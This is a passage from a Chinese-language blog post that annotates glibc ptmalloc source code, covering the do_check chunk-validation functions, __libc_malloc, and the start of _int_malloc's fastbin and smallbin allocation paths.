title="do_check_remalloced_chunk"></a>do_check_remalloced_chunk</h3><p>下面这部分主要判断：</p><p>该chunk要对应上其arena，以及其arena是否为main_arena要和其size中的标志位能对应上；</p><p>对该chunk进行使用状态检查；</p><p>该chunk的size要对齐，大小符合规范；</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span><br><span class="hljs-title function_">do_check_remalloced_chunk</span> <span class="hljs-params">(mstate av, mchunkptr p, INTERNAL_SIZE_T s)</span><br>&#123;<br>  INTERNAL_SIZE_T sz = p-&gt;size &amp; ~(PREV_INUSE | NON_MAIN_ARENA);<br><span class="hljs-comment">//</span><br><span class="hljs-comment">//这部分主要检查chunk是否能对应上其arena，还有是否为main_arena这个问题</span><br><span class="hljs-comment">//</span><br>  <span class="hljs-keyword">if</span> (!chunk_is_mmapped (p))<br>    &#123;<br>      assert (av == arena_for_chunk (p));<br>      <span class="hljs-keyword">if</span> (chunk_non_main_arena (p))<br>        assert (av != &amp;main_arena);<br>      <span class="hljs-keyword">else</span><br>        assert (av == &amp;main_arena);<br>    &#125;<br><br>  do_check_inuse_chunk (av, p);<br><br>  <span class="hljs-comment">/* Legal size ... */</span><br>  assert ((sz &amp; MALLOC_ALIGN_MASK) == <span class="hljs-number">0</span>);<br>  assert ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (sz) &gt;= MINSIZE);<br>  <span class="hljs-comment">/* ... and alignment */</span><br>  assert (aligned_OK (chunk2mem (p)));<br>  <span class="hljs-comment">/* chunk is less than MINSIZE more than request */</span><br>  assert ((<span class="hljs-type">long</span>) (sz) - (<span class="hljs-type">long</span>) (s) &gt;= <span class="hljs-number">0</span>);<br>  assert ((<span class="hljs-type">long</span>) (sz) - (<span class="hljs-type">long</span>) (s + MINSIZE) &lt; <span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="do-check-inuse-chunk"><a href="#do-check-inuse-chunk" class="headerlink" title="do_check_inuse_chunk"></a>do_check_inuse_chunk</h3><p>下面判断了：</p><p>该chunk要处于使用状态；</p><p>如果该chunk的物理相邻的前一个chunk处于未使用状态：</p><p>则用来判断前一个chunk的后一个chunk是该chunk；</p><p>判断前一个空闲chunk符合释放规范</p><p>如果该chunk物理相邻的下一个chunk是topchunk：</p><p>就检查一下topchunk的大小以及</p><p>通过top chunk来判断该chunk处于使用状态</p><p>如果该chunk物理相邻的下一个chunk不是topchunk，并且处于未使用状态：</p><p>确保下一个chunk符合释放规范</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span><br><span class="hljs-title function_">do_check_inuse_chunk</span> <span class="hljs-params">(mstate av, mchunkptr p)</span><br>&#123;<br>  mchunkptr next;<br><br>  do_check_chunk (av, p);<br><br>  <span class="hljs-keyword">if</span> (chunk_is_mmapped (p))<br>    <span class="hljs-keyword">return</span>; <span class="hljs-comment">/* mmapped chunks have no next/prev */</span><br><br>  <span class="hljs-comment">/* Check whether it claims to be in use ... */</span><br>  <span class="hljs-comment">//该chunk处于使用状态，判断方式是通过物理相邻的下一个chunk来判断</span><br>  assert (inuse (p));<br><br>  next = next_chunk (p);<br><br>  <span class="hljs-comment">/* ... and is surrounded by OK chunks.</span><br><span class="hljs-comment">     Since more things can be checked with free chunks than inuse ones,</span><br><span class="hljs-comment">     if an inuse chunk borders them and debug is on, it&#x27;s worth doing them.</span><br><span class="hljs-comment">   */</span><br>  <span class="hljs-keyword">if</span> (!prev_inuse (p))<br>    &#123;<br>      <span class="hljs-comment">/* Note that we cannot even look at prev unless it is not inuse */</span><br>      mchunkptr prv = prev_chunk (p);<br>      assert (next_chunk (prv) == p);<br>      do_check_free_chunk (av, prv);<br>    &#125;<br><br>  <span class="hljs-keyword">if</span> (next == av-&gt;top)<br>    &#123;<br>      assert (prev_inuse (next));<br>      assert (chunksize (next) &gt;= MINSIZE);<br>    &#125;<br>  <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (!inuse (next))<br>    do_check_free_chunk (av, next);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="do-check-free-chunk"><a href="#do-check-free-chunk" class="headerlink" title="do_check_free_chunk"></a>do_check_free_chunk</h3><p>下面检查已释放的chunk，检查以下几个方面：</p><p>基本的chunk规范检查；</p><p>该chunk处于未使用状态；</p><p>该chunk不是mapped；</p><p>该chunk的大小对齐；</p><p>该chunk的size和下一个物理相邻chunk所记录的一致；</p><p>该chunk与其物理相邻的chunk该合并的已合并，通过判断前一个或后一个chunk的使用状态；</p><p>该chunk与其物理相邻chunk的链接确保规范；</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-type">static</span> <span class="hljs-type">void</span><br><span class="hljs-title function_">do_check_free_chunk</span> <span class="hljs-params">(mstate av, mchunkptr p)</span><br>&#123;<br>  INTERNAL_SIZE_T sz = p-&gt;size &amp; ~(PREV_INUSE | NON_MAIN_ARENA);<br>  mchunkptr next = chunk_at_offset (p, sz);<br><br>  do_check_chunk (av, p);<br><br>  <span class="hljs-comment">/* Chunk must claim to be free ... */</span><br>  assert (!inuse (p));<br>  assert (!chunk_is_mmapped (p));<br><br>  <span class="hljs-comment">/* Unless a special marker, must have OK fields */</span><br>  <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (sz) &gt;= MINSIZE)<br>    &#123;<br>      assert ((sz &amp; MALLOC_ALIGN_MASK) == <span class="hljs-number">0</span>);<br>      assert (aligned_OK (chunk2mem (p)));<br>      <span class="hljs-comment">/* ... matching footer field */</span><br>      assert (next-&gt;prev_size == sz);<br>      <span class="hljs-comment">/* ... and is fully consolidated */</span><br>      assert (prev_inuse (p));<br>      assert (next == av-&gt;top || inuse (next));<br><br>      <span class="hljs-comment">/* ... and has minimally sane links */</span><br>      assert (p-&gt;fd-&gt;bk == p);<br>      assert (p-&gt;bk-&gt;fd == p);<br>    &#125;<br>  <span class="hljs-keyword">else</span> <span class="hljs-comment">/* markers are always of size SIZE_SZ */</span><br>    assert (sz == SIZE_SZ);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="do-check-chunk"><a href="#do-check-chunk" class="headerlink" title="do_check_chunk"></a>do_check_chunk</h3><p>下面的判断是检查chunk的地址在其应在的范围内</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-type">static</span> <span class="hljs-type">void</span><br><span class="hljs-title function_">do_check_chunk</span> <span class="hljs-params">(mstate av, mchunkptr p)</span><br>&#123;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> sz = chunksize (p);<br>  <span class="hljs-comment">/* min and max possible addresses assuming contiguous allocation */</span><br>  <span class="hljs-type">char</span> *max_address = (<span class="hljs-type">char</span> *) (av-&gt;top) + chunksize (av-&gt;top);<br>  <span class="hljs-type">char</span> *min_address = max_address - av-&gt;system_mem;<br><br>  <span class="hljs-keyword">if</span> (!chunk_is_mmapped (p))<br>    &#123;<br>      <span class="hljs-comment">/* Has legal address ... */</span><br>      <span class="hljs-keyword">if</span> (p != av-&gt;top)<br>        &#123;<br>          <span class="hljs-keyword">if</span> (contiguous (av))<br>            &#123;<br>              assert (((<span class="hljs-type">char</span> *) p) &gt;= min_address);<br>              assert (((<span class="hljs-type">char</span> *) p + sz) &lt;= ((<span class="hljs-type">char</span> *) (av-&gt;top)));<br>            &#125;<br>        &#125;<br>      <span class="hljs-keyword">else</span><br>        &#123;<br>          <span class="hljs-comment">/* top size is always at least MINSIZE */</span><br>          assert ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (sz) &gt;= MINSIZE);<br>          <span class="hljs-comment">/* top predecessor always marked inuse */</span><br>          assert (prev_inuse (p));<br>        &#125;<br>    &#125;<br>  <span class="hljs-keyword">else</span><br>    &#123;<br>      <span class="hljs-comment">/* address is outside main heap  */</span><br>      <span class="hljs-keyword">if</span> (contiguous (av) &amp;&amp; av-&gt;top != initial_top (av))<br>        &#123;<br>          assert (((<span class="hljs-type">char</span> *) p) &lt; min_address || ((<span class="hljs-type">char</span> *) p) &gt;= max_address);<br>        &#125;<br>      <span class="hljs-comment">/* chunk is page-aligned */</span><br>      assert (((p-&gt;prev_size + sz) &amp; (GLRO (dl_pagesize) - <span class="hljs-number">1</span>)) == <span class="hljs-number">0</span>);<br>      <span class="hljs-comment">/* mem is aligned */</span><br>      assert (aligned_OK (chunk2mem (p)));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="do-check-malloced-chunk"><a href="#do-check-malloced-chunk" class="headerlink" title="do_check_malloced_chunk"></a>do_check_malloced_chunk</h3><p>这个检查其实还是调用上面的代码，就是注意除了上面的检查外，它还额外检查了该chunk p的上一个chunk是使用状态的；</p><p>因为这是在smallbin范围内，如果上一个chunk未处于使用状态，并且在该chunk p未分配之前它也是空闲的，会可能发生合并，而不应该出现两个空闲的chunk并存(fast chunk除外)：</p><p>如果上一个chunk 是fast chunk，prev_inuse标志位生效；</p><p>如果上一个chunk是非fast chunk而且非空闲，则prev_inuse生效；如果上一个是空闲chunk则会发生合并，而不会出现两个空闲的chunk并存；</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-comment">/*</span><br><span class="hljs-comment">   Properties of nonrecycled chunks at the point they are malloced</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span><br><span class="hljs-title function_">do_check_malloced_chunk</span> <span class="hljs-params">(mstate av, mchunkptr p, INTERNAL_SIZE_T s)</span><br>&#123;<br>  <span class="hljs-comment">/* same as recycled case ... */</span><br>  do_check_remalloced_chunk (av, p, s);<br><br>  <span class="hljs-comment">/*</span><br><span class="hljs-comment">     ... plus,  must obey implementation invariant that prev_inuse is</span><br><span class="hljs-comment">     always true of any allocated chunk; i.e., that each allocated</span><br><span class="hljs-comment">     chunk borders either a previously allocated and still in-use</span><br><span class="hljs-comment">     chunk, or the base of its memory arena. This is ensured</span><br><span class="hljs-comment">     by making all allocations from the `lowest&#x27; part of any found</span><br><span class="hljs-comment">     chunk.  This does not necessarily hold however for chunks</span><br><span class="hljs-comment">     recycled via fastbins.</span><br><span class="hljs-comment">   */</span><br><br>  assert (prev_inuse (p));<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="do-check函数之间的调用关系"><a href="#do-check函数之间的调用关系" class="headerlink" title="do_check函数之间的调用关系"></a>do_check函数之间的调用关系</h3><p><img src="/2023/11/26/malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20240826110327985.png"></p><h2 id="malloc的过程"><a href="#malloc的过程" class="headerlink" title="malloc的过程"></a>malloc的过程</h2><p>当我们在C语言中使用malloc函数时会在ptmalloc中调用下面的lib_malloc函数</p><h3 id="lib-malloc"><a href="#lib-malloc" class="headerlink" title="lib_malloc"></a>lib_malloc</h3><p>该函数进行初步的处理，比如获取arena，接着会调用int_malloc</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-type">void</span> *<br>__libc_malloc (<span class="hljs-type">size_t</span> bytes)<br>&#123;<br>  mstate ar_ptr;<br>  <span class="hljs-type">void</span> *victim;<br><span class="hljs-comment">//1.获取malloc_hook</span><br><span class="hljs-comment">//用来判断是否有hook函数，如果有hook函数就调用，否则向下继续进行</span><br><span class="hljs-comment">//</span><br>  <span class="hljs-type">void</span> *(*hook) (<span class="hljs-type">size_t</span>, <span class="hljs-type">const</span> <span class="hljs-type">void</span> *)<br>    = atomic_forced_read (__malloc_hook);<br>  <span class="hljs-keyword">if</span> (__builtin_expect (hook != <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>))<br>    <span class="hljs-keyword">return</span> (*hook)(bytes, RETURN_ADDRESS (<span class="hljs-number">0</span>));<br><span class="hljs-comment">//2.获取arena</span><br><span class="hljs-comment">//获取arena后用int_malloc来分配</span><br><span class="hljs-comment">//</span><br>  arena_get (ar_ptr, bytes);<br><br>  victim = _int_malloc (ar_ptr, bytes);<br>  <span class="hljs-comment">/* Retry with another arena only if we were able to find a usable arena</span><br><span class="hljs-comment">     before.  */</span>                                                                                                      <br>  <span class="hljs-comment">//3.换个arena重试</span><br>  <span class="hljs-comment">//如果上一个arena没有分配成功就换一个重试一下</span><br>  <span class="hljs-comment">//</span><br>  <span class="hljs-keyword">if</span> (!victim &amp;&amp; ar_ptr != <span class="hljs-literal">NULL</span>)<br>    &#123;<br>      LIBC_PROBE (memory_malloc_retry, <span class="hljs-number">1</span>, bytes);<br>      ar_ptr = arena_get_retry (ar_ptr, bytes);<br>      victim = _int_malloc (ar_ptr, bytes);<br>    &#125;<br><br>  <span class="hljs-keyword">if</span> (ar_ptr != <span class="hljs-literal">NULL</span>)<br>    (<span class="hljs-type">void</span>) mutex_unlock (&amp;ar_ptr-&gt;mutex);<br><br>  assert (!victim || chunk_is_mmapped (mem2chunk (victim)) ||<br>          ar_ptr == arena_for_chunk (mem2chunk (victim)));<br>  <span class="hljs-keyword">return</span> victim;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="arena-get"><a href="#arena-get" class="headerlink" title="arena_get"></a>arena_get</h4><p>这个宏是用来获取arena的，方便后面用arena来进行内存分配，主要就是上锁</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">define</span> arena_get(ptr, size) do &#123; \</span><br><span class="hljs-meta">      ptr = thread_arena;                              \</span><br><span class="hljs-meta">      arena_lock (ptr, size);                              \</span><br><span class="hljs-meta">  &#125; while (0)</span><br></code></pre></td></tr></table></figure><h3 id="int-malloc"><a href="#int-malloc" class="headerlink" title="int_malloc"></a>int_malloc</h3><h4 id="定义和一些预操作"><a href="#定义和一些预操作" class="headerlink" title="定义和一些预操作"></a>定义和一些预操作</h4><p>这里主要是一些变量的定义和一些初步操作，比如将用户申请的大小转为chunk的大小，还有就是arena的判断</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-type">static</span> <span class="hljs-type">void</span> *<br>_int_malloc (mstate av, <span class="hljs-type">size_t</span> bytes)<br>&#123;<br>  INTERNAL_SIZE_T nb;               <span class="hljs-comment">/* normalized request size */</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> idx;                 <span class="hljs-comment">/* associated bin index */</span><br>  mbinptr bin;                      <span class="hljs-comment">/* associated bin */</span><br><br>  mchunkptr victim;                 <span class="hljs-comment">/* inspected/selected chunk */</span><br>  INTERNAL_SIZE_T size;             <span class="hljs-comment">/* its size */</span><br>  <span class="hljs-type">int</span> victim_index;                 <span class="hljs-comment">/* its bin index */</span><br><br>  mchunkptr remainder;              <span class="hljs-comment">/* remainder from a split */</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> remainder_size;     <span class="hljs-comment">/* its size */</span><br><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> block;               <span class="hljs-comment">/* bit map traverser */</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> bit;                 <span class="hljs-comment">/* bit map traverser */</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> <span class="hljs-built_in">map</span>;                 <span class="hljs-comment">/* current word of binmap */</span><br><br>  mchunkptr fwd;                    <span class="hljs-comment">/* misc temp for linking */</span><br>  mchunkptr bck;                    <span class="hljs-comment">/* misc temp for linking */</span><br><br>  <span class="hljs-type">const</span> <span class="hljs-type">char</span> *errstr = <span class="hljs-literal">NULL</span>;<br><br>  <span class="hljs-comment">/*</span><br><span class="hljs-comment">     Convert request size to internal form by adding SIZE_SZ bytes</span><br><span class="hljs-comment">     overhead plus possibly more to obtain necessary alignment and/or</span><br><span class="hljs-comment">     to obtain a size of at least MINSIZE, the smallest allocatable</span><br><span class="hljs-comment">     size. Also, checked_request2size traps (returning 0) request sizes</span><br><span class="hljs-comment">     that are so large that they wrap around zero when padded and</span><br><span class="hljs-comment">     aligned.</span><br><span class="hljs-comment">   */</span><br><span class="hljs-comment">//1.将用户申请的大小转为chunk大小</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">//</span><br>  checked_request2size (bytes, nb);<br><br>  <span class="hljs-comment">/* There are no usable arenas.  Fall back to sysmalloc to get a chunk from</span><br><span class="hljs-comment">     mmap.  */</span><br><span class="hljs-comment">//2.如果arena为空，那就调用sysmalloc来分配</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">//</span><br>  <span class="hljs-keyword">if</span> (__glibc_unlikely (av == <span class="hljs-literal">NULL</span>))<br>    &#123;<br>      <span class="hljs-type">void</span> *p = sysmalloc (nb, av);<br>      <span class="hljs-keyword">if</span> (p != <span class="hljs-literal">NULL</span>)<br>    alloc_perturb (p, bytes);<br>      <span class="hljs-keyword">return</span> p;<br>    &#125;<br></code></pre></td></tr></table></figure><h4 id="fastbin"><a href="#fastbin" class="headerlink" title="fastbin"></a>fastbin</h4><p>根据转换后的chunk的大小依次判断是那种类型的chunk，首先就是fastbin，这里先给出代码和注释部分然后看下分配流程</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-comment">/*</span><br><span class="hljs-comment">   If the size qualifies as a fastbin, first check corresponding bin.</span><br><span class="hljs-comment">   This code is safe to execute even if av is not yet initialized, so we</span><br><span class="hljs-comment">   can try it without checking, which saves some time on this fast path.</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (nb) &lt;= (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (get_max_fast ()))<br>  &#123;<br>    idx = fastbin_index (nb);<span class="hljs-comment">//获取chunk大小对应的fastbin索引</span><br>    <br>    <span class="hljs-comment">//#define fastbin(ar_ptr, idx) ((ar_ptr)-&gt;fastbinsY[idx])</span><br>    <span class="hljs-comment">//注意这里是个二级指针</span><br>    <span class="hljs-comment">//fb指向对应的fastbin，pp指向fastbin所指向的chunk</span><br>    mfastbinptr *fb = &amp;fastbin (av, idx);<br>    mchunkptr pp = *fb;<br>    <span class="hljs-comment">//catomic_compare_and_exchange_val_acq(a,b,c)意思是如果*a==c,就将 *a = b;否则不变；返回值一直是 *a</span><br>    <span class="hljs-comment">//所以下面是比较 *fb 与 victim，如果相等就 *fb = victim-&gt;fd，相当于移动一个chunk从而空出一个用来分配</span><br>    <span class="hljs-comment">//外层的pp = .. != victim  其实表达的意思一样，相当于又比较一边</span><br>    <span class="hljs-comment">//下面循环的效果就是从fastbin中摘出一个chunk</span><br>    <span class="hljs-keyword">do</span><br>      &#123;<br>        victim = pp;<br>        <span class="hljs-keyword">if</span> (victim == <span class="hljs-literal">NULL</span>)<br>          <span class="hljs-keyword">break</span>;<br>      &#125;<br>    <span class="hljs-keyword">while</span> ((pp = catomic_compare_and_exchange_val_acq (fb, victim-&gt;fd, victim))<br>           != victim);             <br>    <span class="hljs-comment">//如果victim不为空说明分配了一个chunk</span><br>    <span class="hljs-comment">//下面主要用来检查分配的chunk对应的fastbin索引和最初用来定位该fastchunk的idx是否一致</span><br>    <span class="hljs-comment">//</span><br>    <span class="hljs-keyword">if</span> (victim != <span class="hljs-number">0</span>)<br>      &#123;<br>        <span class="hljs-keyword">if</span> (__builtin_expect (fastbin_index (chunksize (victim)) != idx, <span class="hljs-number">0</span>))<br>          &#123;<br>            errstr = <span class="hljs-string">&quot;malloc(): memory corruption (fast)&quot;</span>;<br>          errout:<br>            malloc_printerr (check_action, errstr, chunk2mem (victim), av);<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>          &#125;<br>        check_remalloced_chunk (av, victim, nb);<br>        <span class="hljs-type">void</span> *p = chunk2mem (victim);<br>        alloc_perturb (p, bytes);<br>        <span class="hljs-keyword">return</span> p;<br>      &#125;<br>  &#125;<br></code></pre></td></tr></table></figure><p>每次从fast bin中分配chunk时，会先获取所申请大小对应fast bin中的索引，然后根据这个索引找到合适的fast bin头部</p><p>每次分配都是先分配其对应fast bin的fd所指向的chunk，我们称为victim，下图为chunk1，分配走后，fast bin的fd指向victim-&gt;fd，下图为chunk2;</p><p><img src="/2023/11/26/malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20240826105607517.png"></p><h4 id="small-bin"><a href="#small-bin" class="headerlink" title="small_bin"></a>small_bin</h4><p>在看这段代码之前，介绍下前面malloc_state的结构体的bins成员。这是一个数组，但是将其抽象成了bin的数组，每个bin由两个单位组成，分别表示fd和bk；</p><p>如下图bin1和bin2，如果将bin2向前移动两个单位，此时bin1和bin2所占的4个单位可以看成一个chunk；</p><p>chunk-&gt;fd和chunk-&gt;bk分别访问的是bin2的fd和bk；</p><p><img src="/2023/11/26/malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/image-20240826111658067.png"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment">    If a small request, check regular bin.  Since these &quot;smallbins&quot;</span><br><span class="hljs-comment">    hold one size each, no searching within bins is necessary.</span><br><span class="hljs-comment">    (For a large request, we need to wait until unsorted chunks are</span><br><span class="hljs-comment">    processed to find best fit. But for small ones, fits are exact</span><br><span class="hljs-comment">    anyway, so we can check now, which is faster.)</span><br><span class="hljs-comment">  */</span><br><br> <span class="hljs-keyword">if</span> (in_smallbin_range (nb))<br>   &#123;        <br>     <span class="hljs-comment">//1.获取大小对应的smallbin索引，然后获取对应的bin，这里是将对应的bin当成一个chunk用</span><br>     <span class="hljs-comment">//</span><br>     <span class="hljs-comment">//</span><br>     idx = smallbin_index (nb);<br>     bin = bin_at (av, idx);<br><br>     <span class="hljs-comment">//2.last(bin)就是bin-&gt;bk，这里取victim = bin-&gt;bk</span><br>     <span class="hljs-comment">//如果victim != bin 说明此small bin不空</span><br>     <span class="hljs-comment">//</span><br>     <span class="hljs-keyword">if</span> ((victim = last (bin)) != bin)<br>       &#123;        